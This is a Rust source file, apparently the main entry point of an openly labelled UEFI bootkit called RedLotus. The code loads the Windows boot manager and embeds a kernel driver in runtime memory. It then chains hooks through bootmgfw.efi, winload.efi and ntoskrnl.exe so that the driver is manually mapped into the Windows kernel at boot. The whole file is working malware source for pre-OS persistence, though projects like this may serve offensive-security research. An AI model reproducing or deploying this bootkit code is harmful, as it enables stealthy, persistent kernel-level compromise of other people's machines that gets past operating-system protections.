#![no_main]
#![no_std]
#![feature(lang_items)]
#![feature(panic_info_message)]
#![feature(offset_of)]

use core::ptr::copy_nonoverlapping;

use crate::{
    boot::globals::{DRIVER_IMAGE_SIZE, DRIVER_PHYSICAL_MEMORY},
    mapper::get_nt_headers,
};
use log::LevelFilter;
use uefi::{
    prelude::*,
    table::boot::{AllocateType, MemoryType},
};

mod boot;
mod mapper;

// Change as you like
#[cfg(not(test))]
#[panic_handler]
fn panic_handler(info: &core::panic::PanicInfo) -> ! {
    if let Some(location) = info.location() {
        log::error!(
            "[-] Panic in {} at ({}, {}):",
            location.file(),
            location.line(),
            location.column()
        );
        if let Some(message) = info.message() {
            log::error!("[-] {}", message);
        }
    }

    loop {}
}

/* The image handle represents the currently-running executable, and the system table provides access to many different UEFI services.
(Removed as it requires uefi_services::init)
//#[entry]
//fn main(image_handle: handle, image_handle: Handle, mut system_table: SystemTable<Boot>) { }
*/

#[no_mangle]
fn efi_main(image_handle: Handle, system_table: SystemTable<Boot>) -> Status {
    /* Setup a simple memory allocator, initialize logger, and provide panic handler. (Removed as it conflicts with com_logger) */
    //uefi_services::init(&mut system_table).unwrap();

    /* Clear stdout/stderr output screen */
    //system_table.stdout().clear().expect("Failed to clear the stdout output screen.");
    //system_table.stderr().clear().expect("Failed to clear the stderr output screen.");

    /* Setup a logger with the default settings. The default settings is COM1 port with level filter Info */
    //com_logger::init();

    // Use COM2 port with level filter Info
    com_logger::builder()
        .base(0x2f8)
        .filter(LevelFilter::Info)
        .setup();

    log::info!("### UEFI Bootkit (RedLotus) in Rust by memN0ps ###");

    let boot_services = system_table.boot_services();
    unsafe { boot_services.set_image_handle(image_handle) };
    unsafe { uefi::allocator::init(boot_services) };

    /* Locate and load Windows EFI Boot Manager (bootmgfw.efi) */
    let bootmgfw_handle =
        boot::pe::load_windows_boot_manager(boot_services).expect("Failed to load image");
    log::info!("[+] Image Loaded Successfully!");

    // Read Windows kernel driver from disk as bytes and data in global variable for later
    let mut driver_bytes =
        include_bytes!("../../target/x86_64-pc-windows-msvc/debug/redlotus.sys").to_vec();

    log::info!(
        "[+] RedLotus.sys Bytes Address: {:#p}",
        driver_bytes.as_mut_ptr()
    );
    log::info!("[+] RedLotus.sys Bytes Length: {:#x}", driver_bytes.len());

    let nt_headers = unsafe { get_nt_headers(driver_bytes.as_mut_ptr()).unwrap() };
    log::info!("[+] RedLotus.sys SizeOfImage: {:#x}", unsafe {
        (*nt_headers).OptionalHeader.SizeOfImage as u64
    });
    unsafe { DRIVER_IMAGE_SIZE = (*nt_headers).OptionalHeader.SizeOfImage as u64 };

    /* Allocates memory pages from the system for the Windows kernel driver to manually map */
    unsafe {
        DRIVER_PHYSICAL_MEMORY = boot_services
            .allocate_pages(
                AllocateType::AnyPages,
                MemoryType::RUNTIME_SERVICES_CODE,
                size_to_pages(driver_bytes.len()),
            )
            .expect("Failed to allocate memory pages");
        log::info!(
            "[+] Allocated memory pages for the driver at: {:#x}",
            DRIVER_PHYSICAL_MEMORY
        );
    }

    /* Copy Windows kernel driver to the allocated memory*/
    unsafe {
        copy_nonoverlapping(
            driver_bytes.as_mut_ptr(),
            DRIVER_PHYSICAL_MEMORY as *mut u8,
            driver_bytes.len(),
        )
    };

    /* Set up the hook chain from bootmgfw.efi -> windload.efi -> ntoskrnl.exe */
    boot::hooks::setup_hooks(&bootmgfw_handle, boot_services).expect("Failed to setup hooks");
    log::info!(
        "[+] Trampoline hooks setup successfully! (bootmgfw.efi -> windload.efi -> ntoskrnl.exe)"
    );

    /* Make the system pause for 10 seconds */
    log::info!("[+] Stalling the processor for 10 seconds");
    system_table.boot_services().stall(10_000_000);

    /* Start Windows EFI Boot Manager (bootmgfw.efi) */
    log::info!("[+] Starting Windows EFI Boot Manager (bootmgfw.efi)...");
    boot_services
        .start_image(bootmgfw_handle)
        .expect("[-] Failed to start Windows EFI Boot Manager");

    Status::SUCCESS
}

/// Credits to tandasat: https://github.com/tandasat/Hypervisor-101-in-Rust/blob/5e7befc39b915c555f19e71bfb98ed9e8339eb51/hypervisor/src/main.rs#L196
/// Computes how many pages are needed for the given bytes.
fn size_to_pages(size: usize) -> usize {
    const BASE_PAGE_SHIFT: usize = 12;
    const PAGE_MASK: usize = 0xfff;

    (size >> BASE_PAGE_SHIFT) + usize::from((size & PAGE_MASK) != 0)
}
